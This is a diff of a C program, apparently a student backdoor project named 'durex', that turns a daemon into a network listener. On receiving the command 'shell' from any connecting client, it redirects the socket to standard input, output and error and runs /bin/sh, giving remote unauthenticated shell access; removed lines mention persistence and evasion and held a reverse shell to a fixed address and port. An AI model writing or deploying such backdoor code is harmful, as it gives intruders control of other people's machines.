@@ -1,53 +1,61 @@
 #include "durex.h"
 
-#define REMOTE_ADDR "127.0.0.1"
-#define REMOTE_PORT 4242
-
-void    reverse_shell(void)
+void    reverse_shell(int socket)
 {
-    int sock;
     struct sockaddr_in sa;
 
     sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
-    sa.sin_port = htons(REMOTE_PORT);
+    sa.sin_addr.s_addr = inet_addr(DEFAULT_ADDR);
+    sa.sin_port = htons(atoi(DEFAULT_PORT));
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    connect(sock, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(sock, 0);
-    dup2(sock, 1);
-    dup2(sock, 2);
+    connect(socket, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(socket, 0);
+    dup2(socket, 1);
+    dup2(socket, 2);
 
+    // fork
     char *sdf[] = {NULL};
     execv("/bin/sh", sdf);
     return ;
 }
 
-int     main(void)
+void    pending_connection(t_info *info)
 {
+    int client;
+    int len = 0;
+    char buffer[1025] = {0};
+
+    struct sockaddr_in csin = {0};
+    unsigned int size = sizeof(csin);
+
+    // todo : create entry for each conection
+    client = accept(info->socket, (struct sockaddr*)&csin, &size);
+    while (true)
+    {
+        len = recv(client, buffer, 1024, 0);
+
+        // todo : Create handler module for commands
+        if (strncmp("shell", buffer, 5) == 0)
+            reverse_shell(client);
+
+        ft_bzero(buffer, len);
+    }
+    close(client);
+    return ;
+}
+
+int     main(int ac, char **av)
+{
+    t_info serv;
 
     create_daemon_old_style();
 
-    reverse_shell();
-    return (0);
-    // debug
-    syslog (LOG_NOTICE, "Daemon started");
+    if (ac == 2)
+        initialize(&serv, av[1]);
+    else
+        initialize(&serv, DEFAULT_PORT);
 
-    // persistance
-
-    closelog();
-    // evasion
-
-    // remote access
-
-    int i = 0;
-    while (true)
-    {
-        if (i == 6)
-            break ;
-        sleep(10);
-        i++;
-    }
-    syslog (LOG_NOTICE, "Daemon stoped");
+    pending_connection(&serv);
+    close(serv.socket);
     return (0);
 }
